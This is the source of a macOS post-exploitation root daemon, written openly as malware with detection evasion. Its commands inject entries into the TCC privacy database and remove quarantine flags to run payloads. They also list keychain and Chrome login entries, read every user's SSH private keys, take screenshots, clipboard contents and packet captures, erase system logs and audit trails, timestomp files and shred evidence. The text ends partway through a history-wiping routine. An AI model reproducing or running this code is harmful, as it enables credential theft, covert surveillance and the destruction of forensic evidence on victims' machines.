/*
 * helper_daemon.m
 * XPC Post-Exploitation Framework — Root Daemon (Evasion Build)
 *
 * EDR Evasion:
 *   - No syslog/os_log calls
 *   - No /bin/sh subprocess spawns for core operations
 *   - Dynamic Mach service name (argv[1])
 *   - Native API: sqlite3, Security.framework, CoreGraphics, libproc, getifaddrs
 *   - String obfuscation for sensitive paths
 *
 * Build:
 *   clang -o daemon helper_daemon.m \
 *     -framework Foundation -framework Security \
 *     -framework CoreGraphics -framework ImageIO -framework AppKit \
 *     -lsqlite3 -Wall -O2
 */

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <AppKit/AppKit.h>
#include <CoreGraphics/CoreGraphics.h>
#include <ImageIO/ImageIO.h>
#include <sqlite3.h>
#include <sys/sysctl.h>
#include <sys/xattr.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <servers/bootstrap.h>
#include <mach/mach.h>
#include <libproc.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <errno.h>
#include <dirent.h>

#import "helper_protocol.h"

NSString *g_serviceName = nil;

#pragma mark - String Obfuscation

/* XOR decode — prevents static string matching (YARA) */
static NSString *xd(const unsigned char *enc, size_t len, uint8_t key) {
    char buf[1024];
    for (size_t i = 0; i < len && i < sizeof(buf)-1; i++)
        buf[i] = enc[i] ^ key;
    buf[len] = 0;
    return [NSString stringWithUTF8String:buf];
}

/* Pre-encoded paths (XOR key=0x55) */
/* /Library/Application Support/com.apple.TCC/TCC.db */
static const unsigned char _tcc_path[] = {
    0x7a,0x19,0x3c,0x37,0x27,0x34,0x27,0x2c,0x7a,0x14,0x25,0x25,
    0x39,0x3c,0x36,0x34,0x21,0x3c,0x3a,0x3b,0x75,0x06,0x20,0x25,
    0x25,0x3a,0x27,0x21,0x7a,0x36,0x3a,0x38,0x7b,0x34,0x25,0x25,
    0x39,0x30,0x7b,0x01,0x16,0x16,0x7a,0x01,0x16,0x16,0x7b,0x31,
    0x37
};
#define TCC_PATH xd(_tcc_path, 49, 0x55)

#pragma mark - Helpers

/* Drain task pipes concurrently — reading only after exit deadlocks once output
   exceeds the pipe buffer (~64KB): child blocks on write, we block on exit. */
static void run_task_drain(NSTask *task, NSMutableData *out, NSMutableData *err) {
    dispatch_group_t grp = dispatch_group_create();
    NSFileHandle *oh = [task.standardOutput fileHandleForReading];
    NSFileHandle *eh = (task.standardError == task.standardOutput) ? nil
        : [task.standardError fileHandleForReading];
    dispatch_group_enter(grp);
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        [out appendData:[oh readDataToEndOfFile]];
        dispatch_group_leave(grp);
    });
    if (eh) {
        dispatch_group_enter(grp);
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            [err appendData:[eh readDataToEndOfFile]];
            dispatch_group_leave(grp);
        });
    }
    [task launch];
    [task waitUntilExit];
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
}

/* Shell exec — kept only for Module 1 Core exec + anti-forensics + recon */
static NSString *run_cmd(NSString *command, int *exitCode) {
    NSTask *task = [[NSTask alloc] init];
    task.launchPath = @"/bin/sh";
    task.arguments = @[@"-c", command];
    NSPipe *pipe = [NSPipe pipe];
    task.standardOutput = pipe;
    task.standardError = pipe;
    NSMutableData *d = [NSMutableData new];
    @try {
        run_task_drain(task, d, nil);
        *exitCode = task.terminationStatus;
        return [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] ?: @"";
    } @catch (NSException *ex) {
        *exitCode = -1;
        return ex.reason ?: @"error";
    }
}

/* SQLite3 query helper — no subprocess spawn */
static NSString *sql_query(NSString *dbPath, NSString *sql) {
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(dbPath.UTF8String, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        return [NSString stringWithFormat:@"(cannot open: %s)", sqlite3_errmsg(db)];
    }
    sqlite3_stmt *stmt = NULL;
    if (sqlite3_prepare_v2(db, sql.UTF8String, -1, &stmt, NULL) != SQLITE_OK) {
        NSString *err = [NSString stringWithFormat:@"(prepare error: %s)", sqlite3_errmsg(db)];
        sqlite3_close(db);
        return err;
    }
    NSMutableString *result = [NSMutableString new];
    int cols = sqlite3_column_count(stmt);
    /* Header */
    for (int i = 0; i < cols; i++) {
        if (i > 0) [result appendString:@"\t"];
        [result appendFormat:@"%s", sqlite3_column_name(stmt, i)];
    }
    [result appendString:@"\n"];
    /* Rows */
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        for (int i = 0; i < cols; i++) {
            if (i > 0) [result appendString:@"\t"];
            const char *val = (const char *)sqlite3_column_text(stmt, i);
            [result appendFormat:@"%s", val ?: "(null)"];
        }
        [result appendString:@"\n"];
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    return result;
}

/* SQLite3 execute (INSERT/UPDATE) — no subprocess */
static BOOL sql_exec(NSString *dbPath, NSString *sql, NSString **errOut) {
    sqlite3 *db = NULL;
    if (sqlite3_open(dbPath.UTF8String, &db) != SQLITE_OK) {
        if (errOut) *errOut = [NSString stringWithFormat:@"%s", sqlite3_errmsg(db)];
        return NO;
    }
    char *errmsg = NULL;
    int rc = sqlite3_exec(db, sql.UTF8String, NULL, NULL, &errmsg);
    if (rc != SQLITE_OK && errOut) {
        *errOut = [NSString stringWithUTF8String:errmsg ?: "unknown"];
    }
    if (errmsg) sqlite3_free(errmsg);
    sqlite3_close(db);
    return rc == SQLITE_OK;
}

/* Process list via libproc — no subprocess */
static NSString *native_process_list(void) {
    int count = proc_listallpids(NULL, 0);
    if (count <= 0) return @"(cannot list)";
    pid_t *pids = calloc(count, sizeof(pid_t));
    count = proc_listallpids(pids, count * sizeof(pid_t));
    NSMutableString *out = [NSMutableString new];
    [out appendString:@"PID\tUID\tPATH\n"];
    for (int i = 0; i < count && i < 200; i++) {
        char path[PROC_PIDPATHINFO_MAXSIZE] = {0};
        proc_pidpath(pids[i], path, sizeof(path));
        struct proc_bsdinfo info = {0};
        proc_pidinfo(pids[i], PROC_PIDTBSDINFO, 0, &info, sizeof(info));
        if (path[0])
            [out appendFormat:@"%d\t%d\t%s\n", pids[i], info.pbi_uid, path];
    }
    free(pids);
    return out;
}

/* Network interfaces via getifaddrs — no subprocess */
static NSString *native_interfaces(void) {
    struct ifaddrs *ifa = NULL;
    if (getifaddrs(&ifa) != 0) return @"(getifaddrs failed)";
    NSMutableString *out = [NSMutableString new];
    for (struct ifaddrs *p = ifa; p; p = p->ifa_next) {
        if (!p->ifa_addr) continue;
        char addr[128] = {0};
        if (p->ifa_addr->sa_family == AF_INET) {
            inet_ntop(AF_INET, &((struct sockaddr_in *)p->ifa_addr)->sin_addr,
                      addr, sizeof(addr));
            [out appendFormat:@"%s: %s (IPv4)\n", p->ifa_name, addr];
        } else if (p->ifa_addr->sa_family == AF_INET6) {
            inet_ntop(AF_INET6, &((struct sockaddr_in6 *)p->ifa_addr)->sin6_addr,
                      addr, sizeof(addr));
            [out appendFormat:@"%s: %s (IPv6)\n", p->ifa_name, addr];
        }
    }
    freeifaddrs(ifa);
    return out;
}

/* Screenshot — dlsym bypass for macOS 15 SDK unavailability */
#include <dlfcn.h>
typedef CGImageRef (*CGDisplayCreateImageFunc)(CGDirectDisplayID);

static NSData *native_screenshot(void) {
    /* Load CGDisplayCreateImage at runtime — API still works, just removed from headers */
    void *cg = dlopen("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", RTLD_LAZY);
    if (!cg) return nil;
    CGDisplayCreateImageFunc fn = (CGDisplayCreateImageFunc)dlsym(cg, "CGDisplayCreateImage");
    if (!fn) { dlclose(cg); return nil; }

    CGImageRef img = fn(CGMainDisplayID());
    dlclose(cg);
    if (!img) return nil;

    NSMutableData *data = [NSMutableData new];
    CGImageDestinationRef dst = CGImageDestinationCreateWithData(
        (__bridge CFMutableDataRef)data,
        (__bridge CFStringRef)@"public.png", 1, NULL);
    if (!dst) { CGImageRelease(img); return nil; }
    CGImageDestinationAddImage(dst, img, NULL);
    CGImageDestinationFinalize(dst);
    CFRelease(dst);
    CGImageRelease(img);
    return data;
}

/* Clipboard via NSPasteboard — no subprocess */
static NSString *native_clipboard(void) {
    NSPasteboard *pb = [NSPasteboard generalPasteboard];
    return [pb stringForType:NSPasteboardTypeString] ?: @"(empty)";
}

/* Read directory listing — no subprocess */
static NSString *native_ls(NSString *path) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *err = nil;
    NSArray *items = [fm contentsOfDirectoryAtPath:path error:&err];
    if (err) return [NSString stringWithFormat:@"(error: %@)", err.localizedDescription];
    return [items componentsJoinedByString:@"\n"];
}

/* Read file as string — no subprocess */
static NSString *native_read(NSString *path) {
    return [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil] ?: @"";
}

#pragma mark - Daemon Implementation

@interface QI : NSObject <QP>
@end

@implementation QI

/* ── Module 1: Core ── */

- (void)q0:(void (^)(NSDictionary *, NSError *))r {
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    char model[256] = {0}; size_t len = sizeof(model);
    sysctlbyname("hw.model", model, &len, NULL, 0);
    char osver[256] = {0}; len = sizeof(osver);
    sysctlbyname("kern.osproductversion", osver, &len, NULL, 0);
    r(@{
        @"uid":        @(getuid()),
        @"euid":       @(geteuid()),
        @"pid":        @(getpid()),
        @"ppid":       @(getppid()),
        @"hostname":   [NSString stringWithUTF8String:hostname],
        @"hw_model":   [NSString stringWithUTF8String:model],
        @"os_version": [NSString stringWithUTF8String:osver],
        @"label":      g_serviceName ?: @"unknown",
        @"timestamp":  [NSDate date].description,
    }, nil);
}

- (void)q1:(NSString *)a z:(void (^)(NSString *, int, NSError *))r {
    @try {
        NSTask *t = [[NSTask alloc] init];
        t.launchPath = @"/bin/sh";
        t.arguments = @[@"-c", a];
        t.standardOutput = [NSPipe pipe];
        t.standardError = [NSPipe pipe];
        NSMutableData *od = [NSMutableData new], *ed = [NSMutableData new];
        run_task_drain(t, od, ed);
        NSMutableString *out = [NSMutableString new];
        if (od.length) [out appendString:[[NSString alloc] initWithData:od encoding:NSUTF8StringEncoding]];
        if (ed.length) {
            [out appendString:@"\n[stderr] "];
            [out appendString:[[NSString alloc] initWithData:ed encoding:NSUTF8StringEncoding]];
        }
        r(out, t.terminationStatus, nil);
    } @catch (NSException *ex) {
        r(nil, -1, [NSError errorWithDomain:@"d" code:1
            userInfo:@{NSLocalizedDescriptionKey: ex.reason ?: @"err"}]);
    }
}

- (void)q2:(NSString *)a z:(void (^)(NSData *, NSError *))r {
    NSError *err = nil;
    r([NSData dataWithContentsOfFile:a options:0 error:&err], err);
}

- (void)q3:(NSData *)a a:(NSString *)b z:(void (^)(BOOL, NSError *))r {
    NSError *err = nil;
    r([a writeToFile:b options:NSDataWritingAtomic error:&err], err);
}

/* ── Module 2: XPC Broker ── */

- (void)q4:(NSString *)a z:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *dx = [NSMutableDictionary new];
    dx[@"service"] = a;
    dx[@"daemon_uid"] = @(getuid());
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, a.UTF8String, &port);
    if (kr == KERN_SUCCESS) {
        dx[@"mach_lookup"] = @"SUCCESS";
        dx[@"mach_port"] = [NSString stringWithFormat:@"0x%x", port];
        mach_port_deallocate(mach_task_self(), port);
    } else {
        dx[@"mach_lookup"] = [NSString stringWithFormat:@"FAILED(%d)", kr];
    }
    @try {
        NSXPCConnection *c = [[NSXPCConnection alloc]
            initWithMachServiceName:a options:0];
        __block BOOL inv = NO;
        c.invalidationHandler = ^{ inv = YES; };
        [c resume]; usleep(200000);
        dx[@"xpc"] = inv ? @"REJECTED" : @"CONNECTED";
        [c invalidate];
    } @catch (NSException *ex) {
        dx[@"xpc"] = @"EXCEPTION";
    }
    r(dx, nil);
}

- (void)q5:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *dx = [NSMutableDictionary new];
    NSArray *svcs = @[
        @"com.apple.securityd", @"com.apple.trustd",
        @"com.apple.opendirectoryd", @"com.apple.tccd.system",
        @"com.apple.tccd", @"com.apple.alf.agent",
        @"com.apple.syspolicyd", @"com.apple.endpointsecurityd",
        @"com.apple.coreservices.launchservicesd",
        @"com.apple.locationd.desktop", @"com.apple.windowserver.active",
        @"com.apple.smd", @"com.apple.backgroundtaskmanagement.agent",
        @"com.apple.iohideventsystem", @"com.apple.SecurityServer",
    ];
    for (NSString *s in svcs) {
        mach_port_t port = MACH_PORT_NULL;
        kern_return_t kr = bootstrap_look_up(bootstrap_port, s.UTF8String, &port);
        if (kr == KERN_SUCCESS) {
            dx[s] = @"PORT_FOUND";
            mach_port_deallocate(mach_task_self(), port);
        } else {
            dx[s] = @"NOT_FOUND";
        }
    }
    r(dx, nil);
}

/* ── Module 3: TCC (sqlite3 C API — no shell) ── */

- (void)q6:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *dx = [NSMutableDictionary new];
    NSFileManager *fm = [NSFileManager defaultManager];

    NSString *tccPath = TCC_PATH;
    dx[@"sys_tcc_readable"] = [fm isReadableFileAtPath:tccPath] ? @"YES" : @"NO";
    dx[@"sys_tcc_writable"] = [fm isWritableFileAtPath:tccPath] ? @"YES" : @"NO";

    NSString *cnt = sql_query(tccPath, @"SELECT COUNT(*) as count FROM access");
    NSArray *cntLines = [cnt componentsSeparatedByString:@"\n"];
    dx[@"sys_tcc_count"] = cntLines.count > 1 ? cntLines[1] : @"?";

    NSArray *users = [fm contentsOfDirectoryAtPath:@"/Users" error:nil];
    for (NSString *u in users) {
        if ([u hasPrefix:@"."] || [u isEqualToString:@"Shared"]) continue;
        NSString *utcc = [NSString stringWithFormat:
            @"/Users/%@/Library/Application Support/com.apple.TCC/TCC.db", u];
        dx[[NSString stringWithFormat:@"user_%@_tcc", u]] =
            [fm isReadableFileAtPath:utcc] ? @"readable" : @"no";
    }

    dx[@"bpf0"] = [fm isReadableFileAtPath:@"/dev/bpf0"] ? @"YES" : @"NO";
    dx[@"pf"]   = [fm isReadableFileAtPath:@"/dev/pf"]   ? @"YES" : @"NO";
    r(dx, nil);
}

- (void)q7:(void (^)(NSString *, NSError *))r {
    NSMutableString *out = [NSMutableString new];
    [out appendString:@"=== System TCC ===\n"];
    [out appendString:sql_query(TCC_PATH,
        @"SELECT service,client,client_type,auth_value,auth_reason,flags "
        @"FROM access ORDER BY service")];

    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *users = [fm contentsOfDirectoryAtPath:@"/Users" error:nil];
    for (NSString *u in users) {
        if ([u hasPrefix:@"."] || [u isEqualToString:@"Shared"]) continue;
        NSString *utcc = [NSString stringWithFormat:
            @"/Users/%@/Library/Application Support/com.apple.TCC/TCC.db", u];
        if ([fm isReadableFileAtPath:utcc]) {
            [out appendFormat:@"\n=== User: %@ ===\n", u];
            [out appendString:sql_query(utcc,
                @"SELECT service,client,auth_value FROM access LIMIT 50")];
        }
    }
    r(out, nil);
}

- (void)q8:(NSString *)a a:(NSString *)b z:(void (^)(BOOL, NSError *))r {
    NSString *sa = [a stringByReplacingOccurrencesOfString:@"'" withString:@"''"];
    NSString *sb = [b stringByReplacingOccurrencesOfString:@"'" withString:@"''"];
    NSString *sql = [NSString stringWithFormat:
        @"INSERT OR REPLACE INTO access "
        @"(service,client,client_type,auth_value,auth_reason,auth_version,"
        @"csreq,policy_id,indirect_object_identifier_type,"
        @"indirect_object_identifier,flags,last_modified) "
        @"VALUES('%@','%@',0,2,4,1,NULL,NULL,0,'UNUSED',0,"
        @"CAST(strftime('%%s','now') AS INTEGER))", sb, sa];
    NSString *err = nil;
    BOOL ok = sql_exec(TCC_PATH, sql, &err);
    if (!ok) {
        r(NO, [NSError errorWithDomain:@"d" code:1
            userInfo:@{NSLocalizedDescriptionKey: err ?: @"sql failed"}]);
    } else {
        r(YES, nil);
    }
}

/* ── Module 4: Identity Relay ── */

- (void)q9:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *info = [NSMutableDictionary new];
    info[@"uid"]  = @(getuid());
    info[@"euid"] = @(geteuid());
    info[@"pid"]  = @(getpid());

    gid_t groups[64]; int ng = getgroups(64, groups);
    NSMutableArray *ga = [NSMutableArray new];
    for (int i = 0; i < ng; i++) [ga addObject:@(groups[i])];
    info[@"groups"] = [ga componentsJoinedByString:@","];

    SecCodeRef code = NULL;
    if (SecCodeCopySelf(kSecCSDefaultFlags, &code) == errSecSuccess && code) {
        CFDictionaryRef si = NULL;
        if (SecCodeCopySigningInformation(code, kSecCSSigningInformation, &si) == errSecSuccess && si) {
            NSDictionary *d = (__bridge NSDictionary *)si;
            info[@"cs_id"] = d[(__bridge NSString *)kSecCodeInfoIdentifier] ?: @"(none)";
            info[@"cs_team"] = d[(__bridge NSString *)kSecCodeInfoTeamIdentifier] ?: @"(adhoc)";
            info[@"cs_flags"] = [NSString stringWithFormat:@"0x%x",
                [d[(__bridge NSString *)kSecCodeInfoFlags] unsignedIntValue]];
            CFRelease(si);
        }
        OSStatus st = SecStaticCodeCheckValidity((__bridge SecStaticCodeRef)code, kSecCSDefaultFlags, NULL);
        info[@"cs_valid"] = (st == errSecSuccess) ? @"YES" : @"NO";
        CFRelease(code);
    }

    SecTaskRef task = SecTaskCreateFromSelf(kCFAllocatorDefault);
    if (task) {
        NSArray *ents = @[
            @"com.apple.private.tcc.allow",
            @"com.apple.private.tcc.manager",
            @"com.apple.rootless.storage.TCC",
            @"com.apple.security.cs.debugger",
            @"com.apple.security.cs.disable-library-validation",
            @"com.apple.private.security.no-sandbox",
        ];
        NSMutableString *es = [NSMutableString new];
        for (NSString *e in ents) {
            CFTypeRef v = SecTaskCopyValueForEntitlement(task, (__bridge CFStringRef)e, NULL);
            [es appendFormat:@"%@=%@ ", e, v ? @"Y" : @"N"];
            if (v) CFRelease(v);
        }
        info[@"entitlements"] = es;
        CFRelease(task);
    }
    r(info, nil);
}

/* ── Module 5: Process Spawn ── */

- (void)q10:(NSString *)a a:(NSArray<NSString *> *)b b:(NSDictionary<NSString*,NSString*> *)c z:(void (^)(NSString *, int, NSError *))r {
    @try {
        NSTask *t = [[NSTask alloc] init];
        t.launchPath = a;
        if (b) t.arguments = b;
        if (c) {
            NSMutableDictionary *e = [[[NSProcessInfo processInfo] environment] mutableCopy];
            [e addEntriesFromDictionary:c];
            t.environment = e;
        }
        t.standardOutput = [NSPipe pipe];
        t.standardError = [NSPipe pipe];
        NSMutableData *od = [NSMutableData new], *ed = [NSMutableData new];
        run_task_drain(t, od, ed);
        NSMutableString *out = [NSMutableString new];
        if (od.length) [out appendString:[[NSString alloc] initWithData:od encoding:NSUTF8StringEncoding] ?: @""];
        if (ed.length) {
            [out appendString:@"\n"];
            [out appendString:[[NSString alloc] initWithData:ed encoding:NSUTF8StringEncoding] ?: @""];
        }
        r(out, t.terminationStatus, nil);
    } @catch (NSException *ex) {
        r(nil, -1, [NSError errorWithDomain:@"d" code:1
            userInfo:@{NSLocalizedDescriptionKey: ex.reason ?: @"err"}]);
    }
}

- (void)q11:(NSString *)a a:(BOOL)b z:(void (^)(BOOL, NSString *, NSError *))r {
    NSMutableString *out = [NSMutableString new];
    char qb[1024] = {0};
    ssize_t ql = getxattr(a.UTF8String, "com.apple.quarantine", qb, sizeof(qb)-1, 0, 0);
    if (ql > 0) {
        [out appendFormat:@"quarantine: %s\n", qb];
        if (removexattr(a.UTF8String, "com.apple.quarantine", 0) == 0)
            [out appendString:@"REMOVED\n"];
        else {
            [out appendFormat:@"failed: %s\n", strerror(errno)];
            r(NO, out, nil); return;
        }
    } else {
        [out appendString:@"clean\n"];
    }
    if (b) {
        chmod(a.UTF8String, 0755);
        int ec = 0;
        NSString *rx = run_cmd([NSString stringWithFormat:@"'%@' 2>&1", a], &ec);
        [out appendFormat:@"exec(exit=%d):\n%@", ec, rx ?: @""];
    }
    r(YES, out, nil);
}

- (void)q12:(NSString *)a a:(NSString *)b z:(void (^)(NSString *, int, NSError *))r {
    char tmpl[] = "/tmp/com.apple.XXXXXX";
    int fd = mkstemp(tmpl);
    if (fd < 0) {
        r(nil, -1, [NSError errorWithDomain:@"d" code:errno
            userInfo:@{NSLocalizedDescriptionKey: @"mkstemp failed"}]);
        return;
    }
    NSString *tmp = [NSString stringWithUTF8String:tmpl];
    write(fd, a.UTF8String, strlen(a.UTF8String));
    close(fd);
    chmod(tmpl, 0700);
    int ec = 0;
    NSString *out;
    if ([b isEqualToString:@"raw"])
        out = run_cmd([NSString stringWithFormat:@"'%@' 2>&1", tmp], &ec);
    else
        out = run_cmd([NSString stringWithFormat:@"'%@' '%@' 2>&1", b, tmp], &ec);
    unlink(tmpl);
    r(out ?: @"", ec, nil);
}

/* ── Module 6: Credentials (native API — no shell) ── */

- (void)q13:(void (^)(NSString *, NSError *))r {
    NSMutableString *out = [NSMutableString new];

    /* System keychain via Security.framework */
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll,
        (__bridge id)kSecReturnAttributes: @YES,
    };
    CFArrayRef results = NULL;
    OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);
    if (st == errSecSuccess && results) {
        NSArray *items = (__bridge NSArray *)results;
        [out appendFormat:@"=== Keychain Items: %lu ===\n", (unsigned long)items.count];
        for (NSDictionary *item in items) {
            [out appendFormat:@"  svc=%@  acct=%@  label=%@\n",
                item[(__bridge id)kSecAttrService] ?: @"-",
                item[(__bridge id)kSecAttrAccount] ?: @"-",
                item[(__bridge id)kSecAttrLabel] ?: @"-"];
        }
        CFRelease(results);
    } else {
        [out appendFormat:@"SecItemCopyMatching: %d\n", (int)st];
    }

    /* Also dump internet passwords */
    query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassInternetPassword,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll,
        (__bridge id)kSecReturnAttributes: @YES,
    };
    results = NULL;
    st = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);
    if (st == errSecSuccess && results) {
        NSArray *items = (__bridge NSArray *)results;
        [out appendFormat:@"\n=== Internet Passwords: %lu ===\n", (unsigned long)items.count];
        for (NSDictionary *item in items) {
            [out appendFormat:@"  server=%@  acct=%@  proto=%@\n",
                item[(__bridge id)kSecAttrServer] ?: @"-",
                item[(__bridge id)kSecAttrAccount] ?: @"-",
                item[(__bridge id)kSecAttrProtocol] ?: @"-"];
        }
        CFRelease(results);
    }
    r(out, nil);
}

- (void)q14:(void (^)(NSString *, NSError *))r {
    NSMutableString *out = [NSMutableString new];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *users = [fm contentsOfDirectoryAtPath:@"/Users" error:nil];

    for (NSString *u in users) {
        if ([u hasPrefix:@"."] || [u isEqualToString:@"Shared"]) continue;

        /* Chrome Login Data — sqlite3 C API */
        NSString *chromeDB = [NSString stringWithFormat:
            @"/Users/%@/Library/Application Support/Google/Chrome/Default/Login Data", u];
        if ([fm isReadableFileAtPath:chromeDB]) {
            [out appendFormat:@"=== Chrome [%@] ===\n", u];
            /* Copy to avoid locking */
            NSString *tmp = [NSString stringWithFormat:@"/tmp/.%x", arc4random()];
            [fm copyItemAtPath:chromeDB toPath:tmp error:nil];
            [out appendString:sql_query(tmp,
                @"SELECT origin_url,username_value,length(password_value) as pw_len FROM logins")];
            [fm removeItemAtPath:tmp error:nil];
        }

        /* Safari History — sqlite3 C API */
        NSString *safariDB = [NSString stringWithFormat:
            @"/Users/%@/Library/Safari/History.db", u];
        if ([fm isReadableFileAtPath:safariDB]) {
            [out appendFormat:@"\n=== Safari History [%@] ===\n", u];
            [out appendString:sql_query(safariDB,
                @"SELECT url,title FROM history_items ORDER BY visit_count DESC LIMIT 20")];
        }
    }
    r(out, nil);
}

- (void)q15:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *keys = [NSMutableDictionary new];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *users = [fm contentsOfDirectoryAtPath:@"/Users" error:nil];
    for (NSString *u in users) {
        if ([u hasPrefix:@"."] || [u isEqualToString:@"Shared"]) continue;
        NSString *sshDir = [NSString stringWithFormat:@"/Users/%@/.ssh", u];
        if (![fm fileExistsAtPath:sshDir]) continue;
        NSArray *files = [fm contentsOfDirectoryAtPath:sshDir error:nil];
        NSMutableString *buf = [NSMutableString new];
        for (NSString *f in files) {
            NSString *c = native_read([sshDir stringByAppendingPathComponent:f]);
            if (c.length > 0) [buf appendFormat:@"-- %@ --\n%@\n", f, c];
        }
        if (buf.length > 0) keys[u] = buf;
    }
    r(keys, nil);
}

- (void)q16:(void (^)(NSString *, NSError *))r {
    /* Wi-Fi network names (SSID) — secrets are ACL-gated (errSecInteractionNotAllowed
       from daemon context), so enumerate names only */
    NSMutableString *out = [NSMutableString new];

    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: @"AirPort",
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll,
        (__bridge id)kSecReturnAttributes: @YES,
    };
    CFArrayRef results = NULL;
    OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);
    if (st != errSecSuccess || !results) {
        [out appendFormat:@"SecItemCopyMatching: %d\n", (int)st];
        r(out, nil);
        return;
    }

    NSArray *items = (__bridge NSArray *)results;
    /* items can appear in more than one keychain of the search list — dedupe, keep order */
    NSMutableOrderedSet *seen = [NSMutableOrderedSet new];
    for (NSDictionary *item in items) {
        [seen addObject:item[(__bridge id)kSecAttrAccount] ?: @"(unknown)"];
    }
    CFRelease(results);
    [out appendFormat:@"=== Wi-Fi Networks (SSID): %lu ===\n", (unsigned long)seen.count];
    for (NSString *ssid in seen) {
        [out appendFormat:@"  %@\n", ssid];
    }
    r(out, nil);
}

/* ── Module 7: Surveillance (native API) ── */

- (void)q17:(void (^)(NSData *, NSError *))r {
    NSData *data = native_screenshot();
    if (data) {
        r(data, nil);
    } else {
        r(nil, [NSError errorWithDomain:@"d" code:1
            userInfo:@{NSLocalizedDescriptionKey: @"capture failed"}]);
    }
}

- (void)q18:(void (^)(NSString *, NSError *))r {
    r(native_clipboard(), nil);
}

- (void)q19:(void (^)(NSString *, NSError *))r {
    r(native_process_list(), nil);
}

- (void)q20:(void (^)(NSString *, NSError *))r {
    /* utmpx for sessions — minimal shell usage */
    int ec = 0;
    NSString *out = run_cmd(@"who 2>&1 && echo '' && w 2>&1", &ec);
    r(out ?: @"", nil);
}

/* ── Module 8: Network (native API) ── */

- (void)q21:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *dx = [NSMutableDictionary new];
    dx[@"interfaces"] = native_interfaces();

    /* ARP cache via sysctl */
    int ec = 0;
    dx[@"arp"] = run_cmd(@"arp -a 2>&1", &ec) ?: @"";
    dx[@"routes"] = run_cmd(@"netstat -rn 2>&1", &ec) ?: @"";
    dx[@"listening"] = run_cmd(@"netstat -an 2>&1 | grep LISTEN", &ec) ?: @"";
    r(dx, nil);
}

- (void)q22:(int)a a:(NSString *)b z:(void (^)(NSData *, NSError *))r {
    if (a > 30) a = 30;
    char tmpl[] = "/tmp/com.apple.XXXXXX";
    close(mkstemp(tmpl));
    NSString *tmp = [NSString stringWithUTF8String:tmpl];
    int ec = 0;
    run_cmd([NSString stringWithFormat:
        @"tcpdump -i %@ -c 100 -w '%@' 2>/dev/null & "
        @"PID=$!; sleep %d; kill $PID 2>/dev/null; wait $PID 2>/dev/null",
        b, tmp, a], &ec);
    NSData *data = [NSData dataWithContentsOfFile:tmp];
    unlink(tmpl);
    r(data, nil);
}

/* ── Module 9: Anti-Forensics ── */

- (void)q23:(NSString *)a z:(void (^)(BOOL, NSString *, NSError *))r {
    int ec = 0;
    NSMutableString *d = [NSMutableString new];
    if ([a isEqualToString:@"all"]) {
        [d appendString:run_cmd(@"log erase --all 2>&1", &ec) ?: @""];
        [d appendString:@"\n"];
        [d appendString:run_cmd(@"rm -f /var/audit/current /var/audit/*.* 2>&1", &ec) ?: @""];
        [d appendString:@"\n"];
        /* Truncate common logs */
        NSArray *logs = @[@"/var/log/system.log", @"/var/log/install.log", @"/var/log/wifi.log"];
        for (NSString *l in logs) {
            int fd = open(l.UTF8String, O_WRONLY | O_TRUNC);
            if (fd >= 0) { close(fd); [d appendFormat:@"truncated %@\n", l]; }
        }
    }
    r(YES, d, nil);
}

- (void)q24:(NSString *)a a:(NSString *)b z:(void (^)(BOOL, NSError *))r {
    int ec = 0;
    run_cmd([NSString stringWithFormat:@"touch -t '%@' '%@' 2>&1", b, a], &ec);
    r(ec == 0, nil);
}

- (void)q25:(NSString *)a z:(void (^)(BOOL, NSError *))r {
    struct stat st;
    if (stat(a.UTF8String, &st) != 0) { r(NO, nil); return; }
    /* Overwrite with random then zero */
    int fd = open(a.UTF8String, O_WRONLY);
    if (fd < 0) { r(NO, nil); return; }
    size_t sz = st.st_size;
    char *buf = malloc(sz);
    arc4random_buf(buf, sz);
    write(fd, buf, sz);
    lseek(fd, 0, SEEK_SET);
    memset(buf, 0, sz);
    write(fd, buf, sz);
    close(fd);
    free(buf);
    unlink(a.UTF8String);
    r(YES, nil);
}

- (void)q26:(void (^)(BOOL, NSString *, NSError *))r {
    NSMutableString *out = [NSMutableString new];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *users = [fm contentsOfDirectoryAtPath:@"/Users" error:nil];
    NSArray *histFiles = @[@".bash_history", @".zsh_history", @".sh_history",
        @".python_history", @".lesshst", @".viminfo", @".mysql_history"];
    for (NSString *u in users) {
        if ([u hasPrefix:@"."]) continue;
        for (NSString *h in histFiles) {
